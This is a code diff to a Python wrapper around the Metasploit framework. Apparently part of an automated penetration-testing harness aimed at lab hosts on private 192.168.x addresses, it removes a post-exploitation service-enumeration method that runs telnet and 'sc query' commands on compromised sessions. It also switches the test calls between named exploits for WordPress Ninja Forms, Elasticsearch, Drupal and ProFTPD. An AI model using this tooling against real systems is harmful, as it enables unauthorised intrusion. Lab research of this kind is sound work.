@@ -119,7 +119,7 @@ class MsfClient():
                 module._runopts[pkey] = pval
 
         if run_with_console:
-            output = self.console.run_module_with_output(module, payload=payload, timeout=300)
+            output = self.console.run_module_with_output(module, payload=payload, timeout=180)
 
             # print(output)
             self.logger.debug(output)
@@ -341,41 +341,6 @@ class MsfClient():
         self.logger.warning(f"Os detection failed for session {session_id}")
         return None
 
-    def get_services_by_cmd(self, session_id, os="linux"):
-        if os == "linux":
-            available_services = []
-            web_server_connected = "Connected to " in self.run_shell_command(session_id, "echo \"\x1dclose\x0d\" | telnet localhost 80", os='linux')
-            # services_request_result = self.run_command(session_id, "lsof | grep proftpd", os='linux')
-            # if "apache2" in services_request_result:
-            if web_server_connected:
-                web_dir1 = "/var/www/html/"
-                www_dir_list = self.run_shell_command(session_id, f'ls -1 {web_dir1}', os='linux').split("\n")
-                if "phpwiki" in www_dir_list:
-                    available_services.append("80_phpwiki")
-                if "drupal" in www_dir_list:
-                    available_services.append("80_drupal")
-
-            proftpd_connected = "Connected to " in self.run_shell_command(session_id, "echo \"\x1dclose\x0d\" | telnet localhost 21", os='linux')
-            if proftpd_connected:
-                available_services.append("21_proftpd")
-            return available_services
-
-        elif os == "windows": # TODO: check
-            available_services = []
-            services_request_result = self.run_shell_command(session_id, "sc query | findstr \"SERVICE_NAME\"", os='windows').splitlines()
-            characters_to_skip = len("SERVICE_NAME: ")
-            services_request_result = [line[characters_to_skip:] for line in services_request_result if line.startswith("SERVICE_NAME: ")]
-            if "wampapache" in services_request_result:
-                wamp_web_dir = "C:\\wamp\\www"
-                www_dirs_result = self.run_shell_command(session_id, f'dir {wamp_web_dir} /a', os='windows')
-                if "wordpress" in www_dirs_result:
-                    available_services.append("80_wp_ninja")
-            if "elasticsearch-service-x64" in services_request_result:
-                available_services.append("9200_elasticsearch")
-            return available_services
-        else:
-            return []
-
     def is_session_meterpreter(self, session_id):
         sessions = self.get_sessions()
         if session_id not in sessions:
@@ -393,10 +358,11 @@ if __name__ == '__main__':
 
     import random
 
-    msfclient = MsfClient('msfpassword')
+    msfclient = MsfClient('msfpassword', '192.168.0.100')
     
-    # msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
-    msfclient.exploit_elasticsearch_script_mvel_rce('192.168.1.100')
+    msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
+    msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
+    # msfclient.exploit_elasticsearch_script_mvel_rce('192.168.1.100')
 
     # msfclient.exploit_drupal_coder_exec('192.168.1.101')
     # msfclient.exploit_proftpd_modcopy_exec('192.168.1.100')
